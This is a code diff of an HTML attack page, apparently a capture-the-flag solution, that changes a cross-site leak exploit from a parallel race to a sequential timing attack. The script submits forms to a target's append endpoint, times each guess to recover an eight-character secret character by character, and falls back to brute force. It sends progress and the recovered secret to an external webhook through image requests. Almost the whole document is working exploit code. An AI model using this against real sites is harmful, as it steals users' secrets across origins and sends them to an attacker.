@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><title>XS-Leak Parallel Race</title></head>
+<head><title>XS-Leak Sequential</title></head>
 <body>
 <div id="s">Loading...</div>
 <script>
@@ -13,72 +13,31 @@ function report(msg) {
     new Image().src = WEBHOOK + "?m=" + encodeURIComponent(msg);
 }
 
-report("RACE_V2");
+report("SEQ_V3");
 
-// Race all 16 chars in parallel - first to complete wins
-function racePosition(prefix) {
+function testPrefix(prefix) {
     return new Promise(function(resolve) {
-        var results = [];
-        var pending = CHARS.length;
-        var intervals = [];
-        var timeouts = [];
+        var url = TARGET + "/append?content=" + encodeURIComponent(prefix) + "&url=" + encodeURIComponent(TARGET + "/");
+        var wname = "w" + Math.random().toString(36).slice(2);
         
-        for (var i = 0; i < CHARS.length; i++) {
-            (function(c, idx) {
-                var wname = "r" + idx + "_" + Date.now();
-                var url = TARGET + "/append?content=" + encodeURIComponent(prefix + c) + "&url=" + encodeURIComponent(TARGET + "/?_=" + Math.random());
-                
-                var form = document.createElement("form");
-                form.method = "GET";
-                form.action = url;
-                form.target = wname;
-                document.body.appendChild(form);
-                
-                var startTime = performance.now();
-                form.submit();
-                document.body.removeChild(form);
-                
-                // Poll for cross-origin error
-                var iv = setInterval(function() {
-                    try {
-                        var w = window.open("", wname);
-                        if (w) {
-                            try {
-                                var loc = w.location.href;
-                                // Still accessible = not loaded yet or same origin
-                            } catch(e) {
-                                // Cross-origin = page loaded
-                                clearInterval(iv);
-                                var elapsed = performance.now() - startTime;
-                                results.push({ c: c, time: elapsed, order: results.length });
-                                try { w.close(); } catch(x) {}
-                                pending--;
-                                if (pending === 0) resolve(results);
-                            }
-                        }
-                    } catch(e) {
-                        clearInterval(iv);
-                        var elapsed = performance.now() - startTime;
-                        results.push({ c: c, time: elapsed, order: results.length });
-                        pending--;
-                        if (pending === 0) resolve(results);
-                    }
-                }, 5);
-                intervals.push(iv);
-                
-                // Timeout
-                var to = setTimeout(function() {
-                    clearInterval(iv);
-                    if (!results.some(function(r) { return r.c === c; })) {
-                        results.push({ c: c, time: 9999, order: results.length });
-                        pending--;
-                        if (pending === 0) resolve(results);
-                    }
-                }, 8000);
-                timeouts.push(to);
-                
-            })(CHARS[i], i);
-        }
+        var form = document.createElement("form");
+        form.method = "GET";
+        form.action = url;
+        form.target = wname;
+        document.body.appendChild(form);
+        
+        var t0 = performance.now();
+        form.submit();
+        document.body.removeChild(form);
+        
+        setTimeout(function() {
+            var elapsed = performance.now() - t0;
+            try { 
+                var w = window.open("", wname);
+                if (w) w.close();
+            } catch(e) {}
+            resolve(elapsed);
+        }, 400);
     });
 }
 
@@ -97,35 +56,36 @@ async function trySecret(secret) {
 
 async function main() {
     report("START");
-    document.getElementById("s").textContent = "Racing...";
+    document.getElementById("s").textContent = "Starting...";
     
     try {
         var secret = "";
         
         for (var pos = 0; pos < 8; pos++) {
-            document.getElementById("s").textContent = "P" + pos + ": " + secret + "_";
+            document.getElementById("s").textContent = "P" + pos + ": " + secret;
+            report("POS" + pos);
             
-            var results = await racePosition(secret);
+            var results = [];
+            for (var i = 0; i < CHARS.length; i++) {
+                var c = CHARS[i];
+                var time = await testPrefix(secret + c);
+                results.push({ c: c, time: time });
+            }
             
-            // Sort by finish order (first to complete)
-            results.sort(function(a, b) { return a.order - b.order; });
+            results.sort(function(a, b) { return a.time - b.time; });
             
-            // Report top 3 finishers
-            var top3 = results.slice(0, 3).map(function(r) {
-                return r.c + ":" + Math.round(r.time) + "#" + r.order;
-            }).join(",");
-            report("P" + pos + ":" + top3);
+            var fast = results[0];
+            var slow = results[results.length - 1];
             
-            // Take first to finish as winner
-            secret += results[0].c;
+            report("P" + pos + ":F=" + fast.c + "(" + Math.round(fast.time) + ")S=" + slow.c + "(" + Math.round(slow.time) + ")");
+            
+            secret += fast.c;
         }
         
         report("SECRET=" + secret);
         
-        // Try the secret
         if (await trySecret(secret)) return;
         
-        // Bruteforce variations
         report("BRUTE");
         for (var pos = 0; pos < 8; pos++) {
             for (var i = 0; i < CHARS.length; i++) {
